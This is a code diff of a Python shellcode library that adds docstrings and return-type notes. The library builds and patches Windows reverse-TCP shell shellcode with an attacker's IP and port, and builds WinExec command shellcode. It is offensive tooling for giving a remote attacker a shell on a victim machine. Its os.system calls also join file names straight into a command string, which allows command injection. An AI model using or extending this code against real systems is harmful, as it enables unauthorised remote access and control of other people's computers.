@@ -6,6 +6,9 @@ A Library to work around shellcodes.
 -LibShellcode.SHELLCODE GenerateCDRTS()
 -LibShellcode.SHELLCODE GenerateCDRTTShell()
 -LibShellcode.SHELLCODE GenerateWinExec(command: str)
+-LibShellcode.SHELLCODE ReadSHELLCODE(inputFile: str)
+-LibShellcode.SHELLCODE EditWinexec(shellcode, command)
+-LibShellcode.SHELLCODE EditCDRTSX32(shellcode, Ip, Port)
 '''
 from SRC.Core import Globals
 from SRC.Libs import LibDebug
@@ -39,7 +42,6 @@ def ReadSHELLCODEASM(inputFile: str):
     Read one ASM file and return a SHELLCODE object
     -return SHELLCODE
     '''
-
     if Globals.Env.ARCH == "AMD64":
         os.system("nasm -f elf64 " + inputFile + " -o shellcode.o & ld -o shellcode shellcode.o & objdump -d shellcode > shellcode.sc")
     else:
@@ -110,7 +112,7 @@ def GenerateCDRTShell(Ip: str, Port: str):
 def GenerateCDRTS():
     '''
     Generate a Dynamic Reverse TCP Staged shellcode.
-    -return string
+    -return SHELLCODE
     '''
     return ReadSHELLCODEASM("ASM/ShellCodes/Windows/" + Globals.Env.ARCH + "/Custom_Dynamic_ReverseTCP_Staged.asm")
 
@@ -118,7 +120,7 @@ def GenerateCDRTS():
 def GenerateCDRTTShell():
     '''
     Generate a Dynamic Reverse TCP Threaded Shell shellcode.
-    -return string
+    -return SHELLCODE
     '''
     return ReadSHELLCODEASM("ASM/ShellCodes/Windows/" + Globals.Env.ARCH + "/Custom_Dynamic_ReverseTCP_Threaded_Shell.asm")
 
@@ -126,7 +128,7 @@ def GenerateCDRTTShell():
 def GenerateWinExec(command: str):
     '''
     Generate a WinExec("cmd.exe /C {command}") shellcode.
-    -return string
+    -return SHELLCODE
     '''
     command = "\"" + command + "\""
     HexCommand = LibDebug.StringToHex(LibDebug.RevertString(command))
@@ -154,6 +156,10 @@ def GenerateWinExec(command: str):
     return ReadSHELLCODEASM("shellcode.asm")
 
 def ReadSHELLCODE(inputFile: str):
+    '''
+    Read a shellcode file.
+    -return SHELLCODE
+    '''
     shellcode = SHELLCODE()
     with open(inputFile, 'r') as fc:
         unparsed_shellcode = fc.read()
@@ -168,6 +174,10 @@ def ReadSHELLCODE(inputFile: str):
     return shellcode
 
 def EditWinexec(shellcode, command):
+    '''
+    Edit WinExec shellcode file.
+    -return SHELLCODE
+    '''
     command = "\"" + command + "\""
     unparsed_HexCommand = LibDebug.StringToHex(LibDebug.RevertString(command))
     while len(unparsed_HexCommand) % 8 != 0:
@@ -182,6 +192,10 @@ def EditWinexec(shellcode, command):
     return shellcode
 
 def EditCDRTSX32(shellcode, Ip, Port):
+    '''
+    Edit Custom Dynamic Reverse TCP Shell shellcode x32 file.
+    -return SHELLCODE
+    '''
     HexIp = LibByteEditor.RevertBytes(LibDebug.IpToHex(Ip))
     HexPort = LibByteEditor.RevertBytes(LibDebug.PortToHex(Port))
     NullByteTrigger = False
